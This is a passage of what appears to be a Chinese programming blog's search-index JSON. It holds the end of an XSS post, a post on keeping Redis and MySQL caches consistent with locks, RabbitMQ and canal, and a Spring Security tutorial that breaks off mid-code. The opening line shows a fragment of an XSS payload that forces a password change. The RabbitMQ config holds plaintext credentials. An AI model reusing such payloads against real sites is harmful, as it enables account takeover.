password_new=123456\u0026amp;password_conf=123456\u0026amp;Change=Change#\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; 参考链接\n开发安全 - XSS 详解\n","permalink":"https://chance7bin.github.io/posts/design/xss/","summary":"XSS是跨站脚本攻击(Cross Site Scripting)，为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为X","title":"xss"},{"content":"背景 如果你的业务处于起步阶段，流量非常小，那无论是读请求还是写请求，直接操作数据库即可，这时你的架构模型是这样的：\n但随着业务量的增长，你的项目请求量越来越大，这时如果每次都从数据库中读数据，那肯定会有性能问题。\n这个阶段通常的做法是，引入「缓存」来提高读性能，架构模型就变成了这样：\n当下优秀的缓存中间件，当属 Redis 莫属，它不仅性能非常高，还提供了很多友好的数据类型，可以很好地满足我们的业务需求。\n但引入缓存之后，你就会面临一个问题：之前数据只存在数据库中，现在要放到缓存中读取，具体要怎么存呢？\nCache Aside Pattern（旁路缓存模式） Cache Aside Pattern 中遇到写请求是这样的：更新 DB，然后直接删除 cache 。\n缓存一致性问题 并发引发的一致性问题 2 个线程并发「读写」数据：\n缓存中 X 不存在（数据库 X = 1） 线程 A 读取数据库，得到旧值（X = 1） 线程 B 更新数据库（X = 2) 线程 B 删除缓存 线程 A 将旧值写入缓存（X = 1） 最终 X 的值在缓存中是 1（旧值），在数据库中是 2（新值），发生不一致。\n这种情况「理论」来说是可能发生的，其实概率「很低」，这是因为它必须满足 3 个条件：\n缓存刚好已失效 读请求 + 写请求并发 更新数据库 + 删除缓存的时间（步骤 3-4），要比读数据库 + 写缓存时间短（步骤 2 和 5） 为了避免这种情况的发生，采取写数据库时「加锁」的方式，防止其它线程对缓存读取和更改\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 ReentrantReadWriteLock lock = new ReentrantReadWriteLock(); public int update(String sql, Object... params) { SqlPair key = new SqlPair(sql, params); // 加写锁, 防止其它线程对缓存读取和更改 lock.writeLock().lock(); try { int rows = genericDao.update(sql, params); map.clear(); return rows; } finally { lock.writeLock().unlock(); } } public T queryOne(Class\u0026lt;T\u0026gt; beanClass, String sql, Object... params) { SqlPair key = new SqlPair(sql, params); // 加读锁, 防止其它线程对缓存更改 lock.readLock().lock(); try { T value = map.get(key); if (value != null) { return value; } } finally { lock.readLock().unlock(); } // 加写锁, 防止其它线程对缓存读取和更改 lock.writeLock().lock(); try { // get 方法上面部分是可能多个线程进来的, 可能已经向缓存填充了数据 // 为防止重复查询数据库, 再次验证 T value = map.get(key); if (value == null) { // 如果没有, 查询数据库 value = genericDao.queryOne(beanClass, sql, params); map.put(key, value); } return value; } finally { lock.writeLock().unlock(); } } 通过上述加锁的逻辑，采取「先更新数据库 + 再删除缓存」的方案，是可以保证数据一致性的\n删除缓存失败引发的一致性问题 「先更新数据库 + 再删除缓存」中第二步执行「失败」导致数据不一致的问题\n如何保证两步都执行成功？\n答案是：重试。\n最佳实线是采取异步重试的方案\n把重试请求写到「消息队列」中，然后由专门的消费者来重试，直到成功。\n或者更直接的做法，为了避免第二步执行失败，我们可以把操作缓存这一步，直接放到消息队列中，由消费者来操作缓存。\n删除缓存操作投递到消息队列中 所以，引入消息队列来解决这个问题，是比较合适的。这时架构模型就变成了这样：\n代码实现\n采取的是RabbitMQ作为消息队列\n更新业务\n清除缓存操作交给rabbitmq listener处理\n1 2 3 4 5 6 7 8 9 10 11 12 13 public int update(String sql, Object... params) { SqlPair key = new SqlPair(sql, params); // 加写锁, 防止其它线程对缓存读取和更改 lock.writeLock().lock(); try { int rows = genericDao.update(sql, params); // map.clear(); MqUtils.sendRedisKeyToMq(key); // 清除缓存操作交给rabbitmq listener处理 return rows; } finally { lock.writeLock().unlock(); } } MqUtils\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 public class MqUtils { /** * redis键 * @param redisKey redis键 * @author 7bin **/ public static void sendRedisKeyToMq(String redisKey){ // 1.准备消息 Message message = MessageBuilder .withBody(redisKey.getBytes(StandardCharsets.UTF_8)) .setDeliveryMode(MessageDeliveryMode.NON_PERSISTENT) .build(); // 2.发送消息 RabbitTemplate rabbitTemplate = SpringUtils.getBean(\u0026#34;rabbitTemplate\u0026#34;); rabbitTemplate.convertAndSend(\u0026#34;redis.queue\u0026#34;, message); } } RabbitMqListener\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 @Slf4j @Component public class RabbitMqListener { @Autowired private RedisCache redisCache; @RabbitListener(queues = \u0026#34;redis.queue\u0026#34;) public void listenRedisQueue(String msg) { log.info(\u0026#34;清除缓存: [ key: {} ]\u0026#34;, msg); redisCache.del(msg); } } yml配置\n开启重试机制\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 spring: rabbitmq: host: 172.21.212.177 # rabbitMQ的ip地址 port: 5672 # 端口 username: binbin password: binbin virtual-host: / # 虚拟主机 listener: simple: prefetch: 1 # 每次从MQ中取出一条消息进行消费 acknowledge-mode: auto # 自动确认 retry: enabled: true # 开启重试机制 initial-interval: 1000 # 重试间隔时间 multiplier: 3 # 重试倍数 max-attempts: 4 # 最大重试次数 数据库更新日志投递到消息队列中 那如果你确实不想在应用中去写消息队列，是否有更简单的方案，同时又可以保证一致性呢？\n方案还是有的，这就是近几年比较流行的解决方案：订阅数据库变更日志，再操作缓存。\n具体来讲就是，我们的业务应用在修改数据时，==「只需」修改数据库，无需操作缓存==。\n那什么时候操作缓存呢？这就和数据库的「变更日志」有关了。\n拿 MySQL 举例，当一条数据发生修改时，MySQL 就会产生一条变更日志（Binlog），我们可以订阅这个日志，拿到具体操作的数据，然后再根据这条数据，去删除对应的缓存。\n订阅变更日志，目前也有了比较成熟的开源中间件，例如阿里的 canal，使用这种方案的优点在于：\n无需考虑写消息队列失败情况：只要写 MySQL 成功，Binlog 肯定会有 自动投递到下游队列：canal 自动把数据库变更日志「投递」给下游的消息队列 canal代码示例\n代码实现\nrabbitmq+canal\n首先配置Mysql整合rabbit\n参考链接：https://blog.csdn.net/qq_37487520/article/details/126078570\nmq队列监听代码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 @Slf4j @Component public class RabbitMqListener { @Autowired private RedisCache redisCache; @RabbitListener(bindings = @QueueBinding( value = @Queue(name = \u0026#34;canal.queue\u0026#34;), exchange = @Exchange(name = \u0026#34;canal.fanout\u0026#34;, type = ExchangeTypes.FANOUT), key = {\u0026#34;canal\u0026#34;} )) public void listenCanalQueue(Message mqMessage, Channel channel) { String message = new String(mqMessage.getBody(), StandardCharsets.UTF_8); // 解析message转换成CanalMessage对象 CanalMessage canalMessage = JSONUtil.toBean(message, CanalMessage.class); String type = canalMessage.getType(); if (type == null) { log.info (\u0026#34;unknown type {}\u0026#34;, canalMessage.getType()); return; } if (type.equals(\u0026#34;INSERT\u0026#34;) || type.equals(\u0026#34;UPDATE\u0026#34;) || type.equals(\u0026#34;DELETE\u0026#34;)) { handleRedisCache(canalMessage.getTable(), canalMessage.getData()); } else { log.info(\u0026#34;ignore type {}\u0026#34;, canalMessage.getType()); } } private void handleRedisCache(String tableName, Object data) { // 根据表名和字段名获取缓存key String key = getKey(tableName, data); redisCache.del(key); log.info(\u0026#34;清除缓存: [ key: {} ]\u0026#34;, key); } String getKey(String tableName, Object data) { // 构建redis key的逻辑 } } 下面是不走消息队列，直接通过cannal监听MySQL的变化\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 @Slf4j @Component public class MysqlDataListening { private static final ThreadFactory springThreadFactory = new CustomizableThreadFactory(\u0026#34;canal-pool-\u0026#34;); private static final ExecutorService executors = Executors.newFixedThreadPool(1, springThreadFactory); @Autowired RedisCache redisCache; @PostConstruct private void startListening() { executors.submit(() -\u0026gt; { connector(); }); } void connector(){ log.info(\u0026#34;start listening mysql data change...\u0026#34;); // 创建链接 CanalConnector connector = CanalConnectors.newSingleConnector(new InetSocketAddress(AddressUtils.getHostIp(), 11111), \u0026#34;example\u0026#34;, \u0026#34;\u0026#34;, \u0026#34;\u0026#34;); int batchSize = 1000; int emptyCount = 0; try { connector.connect(); connector.subscribe(\u0026#34;.*\\\\..*\u0026#34;); connector.rollback(); int totalEmptyCount = 120; // while (emptyCount \u0026lt; totalEmptyCount) { while (true) { Message message = connector.getWithoutAck(batchSize); // 获取指定数量的数据 long batchId = message.getId(); int size = message.getEntries().size(); if (batchId == -1 || size == 0) { // emptyCount++; // System.out.println(\u0026#34;empty count : \u0026#34; + emptyCount); try { Thread.sleep(1000); } catch (InterruptedException e) { } } else { // emptyCount = 0; // System.out.printf(\u0026#34;message[batchId=%s,size=%s] \\n\u0026#34;, batchId, size); printEntry(message.getEntries()); } connector.ack(batchId); // 提交确认 // connector.rollback(batchId); // 处理失败, 回滚数据 } // System.out.println(\u0026#34;empty too many times, exit\u0026#34;); } finally { connector.disconnect(); } } private void printEntry(List\u0026lt;Entry\u0026gt; entrys) { for (Entry entry : entrys) { if (entry.getEntryType() == EntryType.TRANSACTIONBEGIN || entry.getEntryType() == EntryType.TRANSACTIONEND) { continue; } RowChange rowChage = null; try { rowChage = RowChange.parseFrom(entry.getStoreValue()); } catch (Exception e) { throw new RuntimeException(\u0026#34;ERROR ## parser of eromanga-event has an error , data:\u0026#34; + entry.toString(), e); } EventType eventType = rowChage.getEventType(); for (RowData rowData : rowChage.getRowDatasList()) { if (eventType == EventType.DELETE || eventType == EventType.UPDATE || eventType == EventType.INSERT) { // 增删改操作删除redis缓存 // printColumn(rowData.getAfterColumnsList()); handleRedisCache(entry.getHeader().getTableName(), rowData.getAfterColumnsList()); } else { // 其他操作 // System.out.println(\u0026#34;-------\u0026amp;gt; before\u0026#34;); // printColumn(rowData.getBeforeColumnsList()); // System.out.println(\u0026#34;-------\u0026amp;gt; after\u0026#34;); // printColumn(rowData.getAfterColumnsList()); } } } } private void printColumn(List\u0026lt;Column\u0026gt; columns) { for (Column column : columns) { log.info(column.getName() + \u0026#34; : \u0026#34; + column.getValue() + \u0026#34; update=\u0026#34; + column.getUpdated()); } } private void handleRedisCache(String tableName, List\u0026lt;CanalEntry.Column\u0026gt; columns) { // 根据表名和字段名获取缓存key String key = getKey(tableName, columns); redisCache.del(key); } } 实现参考\nmysql与缓存数据不一致解决-canal+mq方案\n通过上述的解决方案基本可以实现缓存与数据库的一致性\n参考链接\n缓存和数据库一致性问题，看这篇就够了\n","permalink":"https://chance7bin.github.io/posts/design/redis%E5%92%8Cmysql%E7%BC%93%E5%AD%98%E4%B8%80%E8%87%B4%E6%80%A7%E5%AE%9E%E7%8E%B0/","summary":"背景 如果你的业务处于起步阶段，流量非常小，那无论是读请求还是写请求，直接操作数据库即可，这时你的架构模型是这样的： 但随着业务量的增长，你的项","title":"redis和mysql缓存一致性实现"},{"content":" 参考链接：\nhttps://blog.csdn.net/liuminglei1987/category_10122574.html\n从零搭建若依(Ruoyi-Vue)管理系统(10)\u0026ndash;Spring Security核心内容梳理\nSpringSecurity-从入门到精通\n认识SpringSecurity Spring Security 是针对Spring项目的安全框架，也是Spring Boot底层安全模块默认的技术选型，他可以实现强大的Web安全控制，对于安全控制，我们仅需要引入 spring-boot-starter-security 模块，进行少量的配置，即可实现强大的安全管理！\n记住几个类：\nWebSecurityConfigurerAdapter：自定义Security策略 AuthenticationManagerBuilder：自定义认证策略 @EnableWebSecurity：开启WebSecurity模式 Spring Security的两个主要目标是 “认证” 和 “授权”（访问控制）。\n“认证”（Authentication）\n身份验证是关于验证您的凭据，如用户名/用户ID和密码，以验证您的身份。\n身份验证通常通过用户名和密码完成，有时与身份验证因素结合使用。\n“授权” （Authorization）\n授权发生在系统成功验证您的身份后，最终会授予您访问资源（如信息，文件，数据库，资金，位置，几乎任何内容）的完全权限。\n这个概念是通用的，而不是只在Spring Security 中存在。\nSpring Secutity核心内容 Spring Secutity中的用户信息 1.UserDetailsService：\n该方法很容易理解： 通过用户名来加载用户 。这个方法主要用于从系统数据中查询并加载具体的用户到 Spring Security中。\n在开发中我们一般定义一个这个接口的实现类，自定义loadUserByUsername方法，实现从数据源获取用户，加载用户信息。也可以在其中实现一些校验用户逻辑。\n1 2 3 4 5 6 @Service public class UserDetailsServiceImpl implements UserDetailsService { @Override public UserDetails loadUserByUsername(String username) throws UsernameNotFoundException { 2.UserDetails:\n从上面 UserDetailsService 可以知道最终交给Spring Security的是UserDetails 。该接口是提供用户信息的核心接口。该接口实现仅仅存储用户的信息。后续会将该接口提供的用户信息封装到认证对象Authentication 中去。\nUserDetails中默认提供：\n用户的权限集， 默认需要添加 ROLE_ 前缀 用户的加密后的密码， 不加密会使用 {noop} 前缀 应用内唯一的用户名 账户是否过期 账户是否锁定 凭证是否过期 用户是否可用 在我们自己的项目中，我们要定义个用户类实现该接口，在该用户类中我们可以扩展更多的用户信息，比如手机、邮箱等等\n3.UserDetailsServiceAutoConfiguration\n关于加密 任何应用考虑到安全，绝不能明文的方式保存密码到数据库。密码应该通过哈希算法进行加密。\n有很多标准的算法比如SHA或者MD5，结合salt(盐)是一个不错的选择。\nSpring Security提供BCryptPasswordEncoder类,实现Spring的PasswordEncoder接口使用BCrypt强哈希方法来加密密码。BCrypt强哈希方法 每次加密的结果都不一样既然每次加密结果不一样，就不可以通过相同字符串加密后的结果来判定是不是同一个字符串了，这就更加增强了安全性。\n如果需要判断是否是原来的密码，需要用它自带的方法。\n加密：\n1 2 BCryptPasswordEncoder encode = new BCryptPasswordEncoder(); encode.encode(password); 判断：\n需要通过自带的方法 matches 将未经过加密的密码和已经过加密的密码传进去进行判断，返回布尔值。\n1 encode.matches(oldpassword,user1.getPassword()); Spring Security的配置 自定义SecurityConfig\n首先要继承WebSecurityConfigurerAdapter，其次最常用的是实现configure(AuthenticationManagerBuilder auth)、configure(WebSecurity web)、configure(HttpSecurity http)三个方法实现我们对Spring Security的自定义安全配置。\nvoid configure(AuthenticationManagerBuilder auth) 用来配置认证管理器 AuthenticationManager。 void configure(WebSecurity web)用来配置 WebSecurity 。而 WebSecurity是基于Servlet Filter用来配置 springSecurityFilterChain。而 springSecurityFilterChain 又被委托给了 Spring Security 核心过滤器 Bean DelegatingFilterProxy 。 相关逻辑你可以在 WebSecurityConfiguration 中找到。我们一般不会过多来自定义 WebSecurity , 使用较多的使其 ignoring() 方法用来忽略 Spring Security 对静态资源的控制。 void configure(HttpSecurity http) 这个是我们使用最多的，用来配置 HttpSecurity 。 HttpSecurity用于构建一个安全过滤器链 SecurityFilterChain。 SecurityFilterChain 最终被注入核心过滤器 。HttpSecurity有许多我们需要的配置。我们可以通过它来进行自定义安全访问策略。 认证流程图 登陆校验流程 SpringSecurity完整流程 SpringSecurity的原理其实就是一个过滤器链，内部包含了提供各种功能的过滤器。这里我们可以看看入门案例中的过滤器。\n图中只展示了核心过滤器，其它的非核心过滤器并没有在图中展示。\nUsernamePasswordAuthenticationFilter：负责处理我们在登陆页面填写了用户名密码后的登陆请求。入门案例的认证工作主要有它负责。\nExceptionTranslationFilter： 处理过滤器链中抛出的任何AccessDeniedException和AuthenticationException 。\nFilterSecurityInterceptor： 负责权限校验的过滤器。\n认证流程详解 概念速查:\nAuthentication接口: 它的实现类，表示当前访问系统的用户，封装了用户相关信息。\nAuthenticationManager接口：定义了认证Authentication的方法\nUserDetailsService接口：加载用户特定数据的核心接口。里面定义了一个根据用户名查询用户信息的方法。\nUserDetails接口：提供核心用户信息。通过UserDetailsService根据用户名获取处理的用户信息要封装成UserDetails对象返回。然后将这些信息封装到Authentication对象中。\n认证过程 认证过滤器UsernamePasswordAuthenticationFilter:它的作用是拦截登录请求并获取账号和 密码，然后把账号密码封装到认证凭据 UsernamePasswordAuthenticationToken 中，然后把凭据交 给特定配置的 AuthenticationManager去作认证。\n授权 权限控制配置 一、基于配置表达式控制 URL 路径\n在继承WebSecurityConfigurerAdapter的配置类中的configure(HttpSecurity http)中进行配置。\n例如：\n1 2 3 4 5 6 7 8 protected void configure(HttpSecurity http) throws Exception { http.authorizeRequests() .antMatchers(\u0026#34;/admin/**\u0026#34;).hasRole(\u0026#34;admin\u0026#34;) .antMatchers(\u0026#34;/user/**\u0026#34;).hasAnyRole(\u0026#34;admin\u0026#34;, \u0026#34;user\u0026#34;) .anyRequest().authenticated() .and() ... } 常用的配置可选项：\n二、基于注解的接口权限控制\n我们可以在任何 @Configuration实例上使用 @EnableGlobalMethodSecurity注解来启用全局方 法安全注解功能\n例如：\n1 2 3 4 5 6 @Configuration @EnableGlobalMethodSecurity(prePostEnabled = true,securedEnabled = true,jsr250Enabled = true) public class SecurityConfig extends WebSecurityConfigurerAdapter { ... ... } 设置 prePostEnabled为 true ，则开启了基于表达式 的方法安全控制。 这个配置开启了四个注解，分别是：\n@PreAuthorize：在标记的方法调用之前，通过表达式来计算是否可以授权访问。 @PostAuthorize：在标记的方法调用之后，通过表达式来计算是否可以授权访问。该注解是针对@PreAuthorize 。区别 在于先执行方法。而后进行表达式判断。如果方法没有返回值实际上等于开放权限控制；如果有返回值 实际的结果是用户操作成功但是得不到响应。 @PreFilter:基于方法入参相关的表达式，对入参进行过滤。 @PostFilter:和 @PreFilter不同的是， 基于返回值相关的表达式，对返回值进行过滤。分页慎用！ 该过程发生接口进行数据返回之前。 设置securedEnabled 为 true ，就开启了角色注解@Secured ，该注解功能要简单的多，默认情况下只能基于角色（默认需要带前缀 ROLE_ ）集合来进行访问控制决策。\n该注解的机制是只要其声明的角色集合(value )中包含当前用户持有的任一角色就可以访问。也就是 用户的角色集合和@Secured注解的角色集合要存在非空的交集。 不支持使用 SpEL表达式进行决策。\n设置 jsr250Enabled为 true ，就开启了 JavaEE 安全 注解中的以下三个：\n@DenyAll 拒绝所有的访问 @PermitAll 同意所有的访问 @RolesAllowed 用法和@Secured 一样。 ==基于注解的权限控制两种实现方式：==\n**第一种：**使用spring security自带的注解\n@PreAuthorize(\u0026quot;hasAnyAuthority('admin','test','system:dept:list')\u0026quot;)\nhasRole要求有对应的角色才可以访问，但是它内部会把我们传入的参数拼接上 ROLE_ 后再去比较。所以这种情况下要用用户对应的权限也要有 ROLE_ 这个前缀才可以。\n第二种：自定义权限校验方法\n在@PreAuthorize注解中使用我们的方法\n1 2 3 4 5 6 7 @PreAuthorize(\u0026#34;@ss.hasPermi(\u0026#39;system:menu:list\u0026#39;)\u0026#34;) @GetMapping(\u0026#34;/list\u0026#34;) public AjaxResult list(SysMenu menu) { List\u0026lt;SysMenu\u0026gt; menus = menuService.selectMenuList(menu, getUserId()); return AjaxResult.success(menus); } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 /** * 验证用户是否具备某权限 * * @param permission 权限字符串 * @return 用户是否具备某权限 */ public boolean hasPermi(String permission) { if (StringUtils.isEmpty(permission)) { return false; } LoginUser loginUser = SecurityUtils.getLoginUser(); if (StringUtils.isNull(loginUser) || CollectionUtils.isEmpty(loginUser.getPermissions())) { return false; } return hasPermissions(loginUser.getPermissions(), permission); } 授权基本流程 在SpringSecurity中，会使用默认的FilterSecurityInterceptor来进行权限校验。在FilterSecurityInterceptor中会从SecurityContextHolder获取其中的Authentication，然后获取其中的权限信息。当前用户是否拥有访问当前资源所需的权限。\n所以我们在项目中只需要把当前登录用户的权限信息也存入Authentication。\n然后设置我们的资源所需要的权限即可。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 /** * 验证用户是否具备某权限 * * @param permission 权限字符串 * @return 用户是否具备某权限 */ public boolean hasPermi(String permission) { if (StringUtils.isEmpty(permission)) { return false; } LoginUser loginUser = SecurityUtils.getLoginUser(); if (StringUtils.isNull(loginUser) || CollectionUtils.isEmpty(loginUser.getPermissions())) { return false; } return hasPermissions(loginUser.getPermissions(), permission); } /** * 获取用户 **/ public static LoginUser getLoginUser() { try { return (LoginUser) getAuthentication().getPrincipal(); } catch (Exception e) { throw new ServiceException(\u0026#34;获取用户信息异常\u0026#34;, HttpStatus.UNAUTHORIZED); } } RBAC权限模型 RBAC权限模型（Role-Based Access Control）即：基于角色的权限控制。这是目前最常被开发者使用也是相对易用、通用权限模型。\n参考链接：\nSpring Security 中的 hasRole 和 hasAuthority 有区别吗？\n登录实现 1.引入 Spring Security 模块 1 2 3 4 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-security\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; 引入依赖后我们在尝试去访问之前的接口就会自动跳转到一个SpringSecurity的默认登陆页面，默认用户名是user,密码会输出在控制台。 必须登陆之后才能对接口进行访问。\n2.编写 Spring Security 配置类 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 @EnableGlobalMethodSecurity(prePostEnabled = true, securedEnabled = true) public class SecurityConfig extends WebSecurityConfigurerAdapter { /** * 自定义用户认证逻辑 */ @Autowired private UserDetailsService userDetailsService; /** * 认证失败处理类 */ @Autowired private AuthenticationEntryPointImpl unauthorizedHandler; /** * 退出处理类 */ @Autowired private LogoutSuccessHandlerImpl logoutSuccessHandler; /** * token认证过滤器 */ @Autowired private JwtAuthenticationTokenFilter authenticationTokenFilter; /** * 跨域过滤器 */ @Autowired private CorsFilter corsFilter; /** * 允许匿名访问的地址 */ @Autowired private PermitAllUrlProperties permitAllUrl; /** * 解决 无法直接注入 AuthenticationManager * * @return * @throws Exception */ @Bean @Override public AuthenticationManager authenticationManagerBean() throws Exception { return super.authenticationManagerBean(); } /** * anyRequest | 匹配所有请求路径 * access | SpringEl表达式结果为true时可以访问 * anonymous | 匿名可以访问 * denyAll | 用户不能访问 * fullyAuthenticated | 用户完全认证可以访问（非remember-me下自动登录） * hasAnyAuthority | 如果有参数，参数表示权限，则其中任何一个权限可以访问 * hasAnyRole | 如果有参数，参数表示角色，则其中任何一个角色可以访问 * hasAuthority | 如果有参数，参数表示权限，则其权限可以访问 * hasIpAddress | 如果有参数，参数表示IP地址，如果用户IP和参数匹配，则可以访问 * hasRole | 如果有参数，参数表示角色，则其角色可以访问 * permitAll | 用户可以任意访问 * rememberMe | 允许通过remember-me登录的用户访问 * authenticated | 用户登录后可访问 */ @Override protected void configure(HttpSecurity httpSecurity) throws Exception { // 注解标记允许匿名访问的url ExpressionUrlAuthorizationConfigurer\u0026lt;HttpSecurity\u0026gt;.ExpressionInterceptUrlRegistry registry = httpSecurity.authorizeRequests(); permitAllUrl.getUrls().forEach(url -\u0026gt; registry.antMatchers(url).permitAll()); httpSecurity // CSRF禁用，因为不使用session // 关闭csrf功能:跨站请求伪造,默认只能通过post方式提交logout请求 .csrf().disable() // 认证失败处理类 .exceptionHandling().authenticationEntryPoint(unauthorizedHandler).and() // 基于token，所以不需要session .sessionManagement().sessionCreationPolicy(SessionCreationPolicy.STATELESS).and() // 过滤请求 .authorizeRequests() // 对于登录login 注册register 验证码captchaImage 允许匿名访问 .antMatchers(\u0026#34;/login\u0026#34;, \u0026#34;/register\u0026#34;, \u0026#34;/captchaImage\u0026#34;).anonymous() // 静态资源，可匿名访问 .antMatchers(HttpMethod.GET, \u0026#34;/\u0026#34;, \u0026#34;/*.html\u0026#34;, \u0026#34;/**/*.html\u0026#34;, \u0026#34;/**/*.css\u0026#34;, \u0026#34;/**/*.js\u0026#34;, \u0026#34;/profile/**\u0026#34;).permitAll() .antMatchers(\u0026#34;/swagger-ui.html\u0026#34;, \u0026#34;/swagger-resources/**\u0026#34;, \u0026#34;/webjars/**\u0026#34;, \u0026#34;/*/api-docs\u0026#34;, \u0026#34;/druid/**\u0026#34;).permitAll() // 除上面外的所有请求全部需要鉴权认证 .anyRequest().authenticated() .and() .headers().frameOptions().disable(); // 添加Logout filter httpSecurity.logout().logoutUrl(\u0026#34;/logout\u0026#34;).logoutSuccessHandler(logoutSuccessHandler); // 添加JWT filter httpSecurity.addFilterBefore(authenticationTokenFilter, UsernamePasswordAuthenticationFilter.class); // 添加CORS filter httpSecurity.addFilterBefore(corsFilter, JwtAuthenticationTokenFilter.class); httpSecurity.addFilterBefore(corsFilter, LogoutFilter.class); // 开启自动配置的登录功能 // http.formLogin() // .loginPage(\u0026#34;/toLogin\u0026#34;) //自定义登录页 // .loginProcessingUrl(\u0026#34;/loginRequest\u0026#34;) // 登陆表单提交的请求 // .passwordParameter(\u0026#34;password\u0026#34;); // 表单中password需与该处对应。默认是password // http.formLogin(); // 开启自动配置的注销的功能 // http.logout().logoutSuccessUrl(\u0026#34;/\u0026#34;); // 注销成功来到首页 // 记住我 // http.rememberMe(); // http.rememberMe(). // rememberMeParameter(\u0026#34;remember\u0026#34;); // 定制记住我的参数 } /** * 强散列哈希加密实现 */ @Bean public BCryptPasswordEncoder bCryptPasswordEncoder() { return new BCryptPasswordEncoder(); } /** * 身份认证接口 */ @Override protected void configure(AuthenticationManagerBuilder auth) throws Exception { // 数据库验证 // Spring Security 提供了BCryptPasswordEncoder类, // 实现Spring的PasswordEncoder接口使用BCrypt强哈希方法来加密密码 auth.userDetailsService(userDetailsService).passwordEncoder(bCryptPasswordEncoder()); } } 3.配置类相关模块 UserDetailsService 自定义用户认证逻辑\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 @Service public class UserDetailsServiceImpl implements UserDetailsService { private static final Logger log = LoggerFactory.getLogger(UserDetailsServiceImpl.class); @Autowired private ISysUserService userService; @Autowired private SysPasswordService passwordService; @Autowired private SysPermissionService permissionService; @Override public UserDetails loadUserByUsername(String username) throws UsernameNotFoundException { SysUser user = userService.selectUserByUserName(username); if (StringUtils.isNull(user)) { log.info(\u0026#34;登录用户：{} 不存在.\u0026#34;, username); throw new ServiceException(\u0026#34;登录用户：\u0026#34; + username + \u0026#34; 不存在\u0026#34;); } else if (UserStatus.DELETED.getCode().equals(user.getDelFlag())) { log.info(\u0026#34;登录用户：{} 已被删除.\u0026#34;, username); throw new ServiceException(\u0026#34;对不起，您的账号：\u0026#34; + username + \u0026#34; 已被删除\u0026#34;); } else if (UserStatus.DISABLE.getCode().equals(user.getStatus())) { log.info(\u0026#34;登录用户：{} 已被停用.\u0026#34;, username); throw new ServiceException(\u0026#34;对不起，您的账号：\u0026#34; + username + \u0026#34; 已停用\u0026#34;); } passwordService.validate(user); return createLoginUser(user); } public UserDetails createLoginUser(SysUser user) { return new LoginUser(user.getUserId(), user); } } AuthenticationEntryPointImpl 认证失败处理类 返回未授权\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 @Component public class AuthenticationEntryPointImpl implements AuthenticationEntryPoint, Serializable { private static final long serialVersionUID = -8970718410437077606L; @Override public void commence(HttpServletRequest request, HttpServletResponse response, AuthenticationException e) throws IOException { int code = HttpStatus.UNAUTHORIZED; String msg = StringUtils.format(\u0026#34;请求访问：{}，认证失败，无法访问系统资源\u0026#34;, request.getRequestURI()); ServletUtils.renderString(response, JSON.toJSONString(ApiResponse.error(code, msg))); } } LogoutSuccessHandlerImpl 自定义退出处理类 返回成功\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 @Configuration public class LogoutSuccessHandlerImpl implements LogoutSuccessHandler { @Autowired private TokenService tokenService; @Autowired private IAsyncService asyncService; /** * 退出处理 * * @return */ @Override public void onLogoutSuccess(HttpServletRequest request, HttpServletResponse response, Authentication authentication) throws IOException, ServletException { LoginUser loginUser = tokenService.getLoginUser(request); if (StringUtils.isNotNull(loginUser)) { String userName = loginUser.getUsername(); // 删除用户缓存记录 tokenService.delLoginUser(loginUser.getToken()); // 记录用户退出日志 asyncService.recordLogininfor(userName, Constants.LOGOUT, \u0026#34;退出成功\u0026#34;); } ServletUtils.renderString(response, JSON.toJSONString(ApiResponse.error(HttpStatus.SUCCESS, \u0026#34;退出成功\u0026#34;))); } } JwtAuthenticationTokenFiltertoken token过滤器 验证token有效性\nSecurityContextHolder 类最核心的作用，便是将当前给定的 SecurityContext 与 当前执行线程绑定，从而方便后续直接获取。\n在SecurityContextHolder中保存的是当前访问者的信息。Spring Security使用一个Authentication对象来表示这个信息。\n通过SecurityContextHolder.getContext().setAuthentication(authentication);方式将用户相关的信息存放到系统的安全上下文中，并且由于 SecurityContextHolder默认是mode_threadlocal模式，那么会将所有登录的用户信息都保存，每个登录的用户都可以通过SecurityContextHolder.getContext().getAuthentication();方式获取 当前自己保存的用户信息\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 @Component public class JwtAuthenticationTokenFilter extends OncePerRequestFilter { @Autowired private TokenService tokenService; @Override protected void doFilterInternal(HttpServletRequest request, 